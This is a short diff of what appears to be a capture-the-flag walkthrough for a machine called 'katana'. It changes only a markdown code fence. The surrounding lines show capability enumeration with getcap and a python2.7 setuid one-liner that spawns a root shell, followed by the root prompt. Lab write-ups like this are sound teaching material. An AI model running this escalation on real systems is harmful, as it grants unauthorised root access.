@@ -21,7 +21,7 @@ getcap -r / 2>/dev/null
 
 Cool, so python2.7 can setuid. Let’s exploit it.
 
-``
+```
 www-data@katana:/$ python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 <c 'import os; os.setuid(0); os.system("/bin/bash")'
 root@katana:/# id
